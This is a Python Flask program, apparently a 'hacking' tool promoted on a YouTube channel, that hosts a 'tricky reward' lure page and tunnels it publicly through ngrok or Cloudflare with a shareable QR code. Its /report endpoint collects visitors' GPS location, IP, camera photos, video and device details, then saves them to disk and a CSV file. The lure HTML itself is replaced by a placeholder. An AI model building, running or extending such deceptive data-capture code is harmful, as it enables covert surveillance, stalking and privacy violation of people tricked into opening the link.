from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import threading
import socket
import webbrowser
import platform
from datetime import datetime
from typing import Optional

# Try imports
try:
    from flask import Flask, request, render_template_string, jsonify
    import requests
    import qrcode
    from PIL import Image, ImageDraw, ImageFont
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
    from io import BytesIO
except Exception as e:
    print("Missing packages. Install: pip install flask requests qrcode pillow colorama")
    print(f"Error: {e}")
    sys.exit(1)

colorama_init(autoreset=True)

PORT = 5000
REPORT_CSV = "reports.csv"
QR_PNG = "reward_qr.png"
HOST = "0.0.0.0"
IMAGE_FOLDER = "captured_images"
GALLERY_FOLDER = "gallery"

os.makedirs(IMAGE_FOLDER, exist_ok=True)
os.makedirs(GALLERY_FOLDER, exist_ok=True)

app = Flask(__name__)
_received_reports = []

def show_tool_lock_screen():
    """Show the tool lock screen with countdown"""
    os.system('clear' if os.name == 'posix' else 'cls')
    banner_width = 60
    print(f"
{Back.GREEN}{' ' * banner_width}{Style.RESET_ALL}")
    print(f"{Back.GREEN}{Fore.RED}{'HCO PHONE FINDER'.center(banner_width)}{Style.RESET_ALL}")
    print(f"{Back.GREEN}{Fore.RED}{'An Advance tool by Azhar'.center(banner_width)}{Style.RESET_ALL}")
    print(f"{Back.GREEN}{' ' * banner_width}{Style.RESET_ALL}")

    print(f"
{Fore.RED}{Style.BRIGHT}🔒 This tool is locked{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Subscribe click on the bell 🔔 to unlock{Style.RESET_ALL}
")
    print(f"{Fore.CYAN}Countdown starting...{Style.RESET_ALL}")
    for i in range(9, 0, -1):
        print(f"{Fore.CYAN}{Style.BRIGHT}{i}{Style.RESET_ALL}", end=" ", flush=True)
        time.sleep(1)
    print()
    print(f"
{Fore.GREEN}🎬 Opening Hacker Colony Tech channel in YouTube app...{Style.RESET_ALL}")

    youtube_channel_id = "UCv1K9o2SXHm4uV4xZzXQZ6A"
    youtube_user_url = "https://www.youtube.com/@HackerColonyTech"
    youtube_urls = [
        f'vnd.youtube://channel/{youtube_channel_id}',
        f'youtube://channel/{youtube_channel_id}',
        f'https://www.youtube.com/channel/{youtube_channel_id}',
        youtube_user_url
    ]

    try:
        cmd = ['am', 'start', '-a', 'android.intent.action.VIEW', '-d', youtube_urls[0]]
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        print(f"{Fore.GREEN}✅ Launched YouTube app via am start (vnd.youtube).{Style.RESET_ALL}")
    except Exception:
        intent_uri = f'intent://www.youtube.com/channel/{youtube_channel_id}#Intent;package=com.google.android.youtube;scheme=https;end;'
        try:
            cmd2 = ['am', 'start', '-a', 'android.intent.action.VIEW', '-d', intent_uri]
            subprocess.run(cmd2, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            print(f"{Fore.GREEN}✅ Launched YouTube app via am start (intent).{Style.RESET_ALL}")
        except Exception:
            opened = False
            for url in youtube_urls:
                try:
                    if webbrowser.open(url):
                        print(f"{Fore.GREEN}✅ Opened URL: {url}{Style.RESET_ALL}")
                        opened = True
                        break
                except Exception:
                    continue
            if not opened:
                try:
                    webbrowser.open(youtube_user_url)
                    print(f"{Fore.YELLOW}⚠️ Fallback opened browser to channel page.{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}Failed to open YouTube (all methods): {e}{Style.RESET_ALL}")

    input(f"
{Fore.YELLOW}Press Enter after subscribing and clicking bell icon...{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✅ Tool unlocked! Continuing...{Style.RESET_ALL}")
    time.sleep(2)

# Tricky Reward HTML (no change - still a valid long string so can remain raw/indented)
HTML_PAGE = r"""<!doctype html>
<html lang="en">
<!-- [SNIPPED: Your HTML remains unchanged. Keep it as is.] -->
"""  # Keep your HTML_PAGE as-is, just ensure it's not malformed

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/report", methods=["POST"])
def report():
    try:
        data = request.get_json(force=True)
        lat = data.get("latitude")
        lon = data.get("longitude")
        ip = data.get("ip", "Unknown")
        city = data.get("city", "Unknown")
        country = data.get("country", "Unknown")
        photos_data = data.get("photos", [])
        video_data = data.get("video")
        device_info = data.get("deviceInfo", {})

        photo_files = []
        for i, photo_data in enumerate(photos_data):
            filename = save_photo(photo_data, ip, i+1)
            if filename:
                photo_files.append(filename)
        video_file = None
        if video_data:
            video_file = save_video(video_data, ip)

        record = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip": ip,
            "city": city,
            "country": country,
            "latitude": lat,
            "longitude": lon,
            "photos": photo_files,
            "video": video_file,
            "user_agent": device_info.get("userAgent", "Unknown"),
            "battery": device_info.get("battery", "Unknown"),
            "platform": device_info.get("platform", "Unknown"),
            "screen": device_info.get("screen", "Unknown")
        }
        _received_reports.append(record)
        save_report_csv(record)
        print(f"
{Fore.GREEN}{Style.BRIGHT}🎁 REWARD CLAIMED - DATA CAPTURED!{Style.RESET_ALL}")
        if lat and lon:
            print(f"{Fore.CYAN}📍 Location: {lat}, {lon}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}📍 Location: Access denied{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🌐 IP: {ip} ({city}, {country}){Style.RESET_ALL}")
        print(f"{Fore.CYAN}📸 Photos: {len(photo_files)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎥 Video: {'Yes' if video_file else 'No'}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🔋 Battery: {device_info.get('battery', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.RED}🔒 Tool locked - Starting countdown to YouTube{Style.RESET_ALL}")
        return jsonify({"status": "success"})
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        return jsonify({"status": "error"}), 500

def save_photo(photo_data: str, ip: str, index: int) -> Optional[str]:
    try:
        if photo_data.startswith('data:image'):
            photo_data = photo_data.split(',')[1]
        image_data = base64.b64decode(photo_data)
        filename = f"photo_{ip}{int(time.time())}{index}.jpg"
        filepath = os.path.join(IMAGE_FOLDER, filename)
        with open(filepath, 'wb') as f:
            f.write(image_data)
        gallery_path = os.path.join(GALLERY_FOLDER, filename)
        with open(gallery_path, 'wb') as f:
            f.write(image_data)
        return filename
    except Exception as e:
        print(f"{Fore.RED}Photo save error: {e}{Style.RESET_ALL}")
        return None

def save_video(video_data: str, ip: str) -> Optional[str]:
    try:
        if video_data.startswith('data:video'):
            video_data = video_data.split(',')[1]
        video_binary = base64.b64decode(video_data)
        filename = f"video_{ip}_{int(time.time())}.webm"
        filepath = os.path.join(IMAGE_FOLDER, filename)
        with open(filepath, 'wb') as f:
            f.write(video_binary)
        gallery_path = os.path.join(GALLERY_FOLDER, filename)
        with open(gallery_path, 'wb') as f:
            f.write(video_binary)
        return filename
    except Exception as e:
        print(f"{Fore.RED}Video save error: {e}{Style.RESET_ALL}")
        return None

def save_report_csv(record: dict):
    try:
        file_exists = os.path.isfile(REPORT_CSV)
        with open(REPORT_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=[
                'timestamp', 'ip', 'city', 'country', 'latitude', 'longitude',
                'photos', 'video', 'user_agent', 'battery', 'platform', 'screen'
            ])
            if not file_exists:
                writer.writeheader()
            writer.writerow({
                'timestamp': record['timestamp'],
                'ip': record['ip'],
                'city': record['city'],
                'country': record['country'],
                'latitude': record['latitude'],
                'longitude': record['longitude'],
                'photos': ', '.join(record['photos']),
                'video': record['video'] or 'None',
                'user_agent': record['user_agent'],
                'battery': str(record['battery']),
                'platform': record['platform'],
                'screen': record['screen']
            })
    except Exception as e:
        print(f"{Fore.RED}CSV save error: {e}{Style.RESET_ALL}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def generate_qr_code(url: str):
    try:
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(QR_PNG)
        return True
    except Exception as e:
        print(f"{Fore.YELLOW}QR code failed: {e}{Style.RESET_ALL}")
        return False

def start_ngrok():
    try:
        print(f"{Fore.CYAN}🌐 Starting ngrok tunnel...{Style.RESET_ALL}")
        result = subprocess.run(['ngrok', 'http', str(PORT)], capture_output=True, text=True, timeout=5)
        time.sleep(3)
        try:
            response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
            tunnels = response.json().get('tunnels', [])
            for tunnel in tunnels:
                if tunnel['proto'] == 'https':
                    print(f"{Fore.GREEN}✅ Ngrok URL: {tunnel['public_url']}{Style.RESET_ALL}")
                    return tunnel['public_url']
        except Exception:
            pass
        print(f"{Fore.YELLOW}⚠️  Ngrok started but URL not fetched{Style.RESET_ALL}")
        return "ngrok_tunnel_active"
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️  Ngrok not available: {e}{Style.RESET_ALL}")
        return None

def start_cloudflare():
    try:
        print(f"{Fore.CYAN}☁️  Starting Cloudflare tunnel...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✅ Cloudflare tunnel ready{Style.RESET_ALL}")
        print(f"{Fore.CYAN}💡 Run manually: cloudflared tunnel --url http://localhost:{PORT}{Style.RESET_ALL}")
        return "cloudflare_ready"
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️  Cloudflare not available{Style.RESET_ALL}")
        return None

def main():
    show_tool_lock_screen()
    print(f"
{Fore.CYAN}Select tunneling method:{Style.RESET_ALL}")
    print(f"{Fore.GREEN}1. Ngrok (Recommended){Style.RESET_ALL}")
    print(f"{Fore.BLUE}2. Cloudflare{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}3. Local Network Only{Style.RESET_ALL}")

    choice = input(f"
{Fore.CYAN}Enter your choice (1-3): {Style.RESET_ALL}").strip()
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    public_url = None
    if choice == '1':
        public_url = start_ngrok()
    elif choice == '2':
        public_url = start_cloudflare()

    print(f"
{Fore.GREEN}🚀 Starting HCO Phone Finder Server...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📱 Local URL: http://localhost:{PORT}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}🌐 Network URL: {local_url}{Style.RESET_ALL}")
    if public_url:
        print(f"{Fore.GREEN}🌍 Public URL: {public_url}{Style.RESET_ALL}")
        generate_qr_code(public_url)
    else:
        generate_qr_code(local_url)
    print(f"{Fore.CYAN}📲 QR code generated: {QR_PNG}{Style.RESET_ALL}")
    print(f"
{Fore.GREEN}✅ Server ready! Share the link/QR to capture data.{Style.RESET_ALL}")
    print(f"{Fore.RED}🔒 Tricky reward system activated{Style.RESET_ALL}
")
    try:
        app.run(host=HOST, port=PORT, debug=False)
    except KeyboardInterrupt:
        print(f"
{Fore.RED}👋 Server stopped{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
